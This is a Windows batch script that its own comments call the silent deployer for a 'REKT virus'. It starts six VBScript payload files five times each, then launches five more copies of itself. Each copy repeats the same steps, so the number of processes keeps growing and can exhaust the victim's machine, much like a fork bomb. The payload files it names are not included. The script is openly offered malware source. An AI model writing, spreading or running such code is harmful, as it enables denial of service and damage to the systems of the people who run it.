@echo off

::Script for silent deployment of the REKT virus.
::You will need the 6 payload files, unchanged.
::This script deploys 5 instances of each payload, as well as start 5 new instances of the silent script.

title REKT (Silent)
echo REKT Virus Silent Deployer v1.2.8&& echo.

::Instance #1
echo Starting phase #1...&& echo.
start payload_1.vbs
start payload_2.vbs
start payload_3.vbs
start payload_4.vbs
start payload_5.vbs
start payload_6.vbs

::Instance #2
echo Starting phase #2...&& echo.
start payload_1.vbs
start payload_2.vbs
start payload_3.vbs
start payload_4.vbs
start payload_5.vbs
start payload_6.vbs

::Instance #3
echo Starting phase #3...&& echo.
start payload_1.vbs
start payload_2.vbs
start payload_3.vbs
start payload_4.vbs
start payload_5.vbs
start payload_6.vbs

::Instance #4
echo Starting phase #4...&& echo.
start payload_1.vbs
start payload_2.vbs
start payload_3.vbs
start payload_4.vbs
start payload_5.vbs
start payload_6.vbs

::Instance #5
echo Starting phase #5...&& echo.
start payload_1.vbs
start payload_2.vbs
start payload_3.vbs
start payload_4.vbs
start payload_5.vbs
start payload_6.vbs

::Replication ability
echo Replicating script...&& echo.
start silent.bat
start silent.bat
start silent.bat
start silent.bat
start silent.bat



